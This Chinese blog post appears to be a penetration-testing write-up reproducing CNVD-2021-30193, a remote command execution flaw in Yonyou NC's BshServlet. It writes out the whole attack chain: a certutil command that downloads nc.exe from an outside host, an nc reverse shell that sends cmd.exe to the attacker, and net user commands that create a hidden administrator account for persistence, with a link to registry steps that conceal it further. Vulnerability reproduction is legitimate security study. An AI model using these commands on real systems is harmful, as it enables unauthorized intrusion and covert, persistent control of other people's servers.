---
title: 从命令执行到getshell
category: 
- 渗透测试
tags: 
- 漏洞复现
---

## CNVD-2021-30193 从命令执行到getshell

### 漏洞简介：**用友 NC bsh.servlet.BshServlet 远程命令执行漏洞**

用友 NC bsh.servlet.BshServlet 存在远程命令执行漏洞，通过BeanShell 执行远程命令获取服务器权限

![image-20210609160221270](https://raw.githubusercontent.com/John-tlh/blog/master/imagesimage-20210609160221270.png)

### 漏洞利用

首先考虑反弹一个稳定的shell。目标主机是Win2012这里选择使用nc,但是目标主机上没有，所以需要先下载下来。

```shell
certutil.exe -urlcache -split -f http://198.xx.xx.xx/nc.exe d:\\xxh.exe
```

服务端开启监听之后再执行：

```shell
d:\\xxh.exe 198.xx.xx.xxx 1988 -e c:\\windows\\system32\\cmd.exe
```

#### 反弹shell

可以看到，目标机已经建立起连接。

![image-20210609162551767](https://raw.githubusercontent.com/John-tlh/blog/master/imagesimage-20210609162551767.png)

![image-20210609164234717](https://raw.githubusercontent.com/John-tlh/blog/master/imagesimage-20210609164234717.png)

#### 持续控制

现在已经得到一个稳定的shell，并且是管理员权限。因此接下来就只需要持久控制进行权限的维持。这里选择使用**Windows系统隐藏账户**

```shell
net user kriller$ kriller /add
net localgroup administrators kriller$ /add
```

接着修改注册表，删除用户，再导入用户信息到注册表。这样该隐藏账户的隐蔽性更高。具体步骤请参考：[链接](https://whoamianony.top/2020/10/25/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%EF%BC%9A%E5%9F%9F%E5%86%85%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/)

<!-- more -->

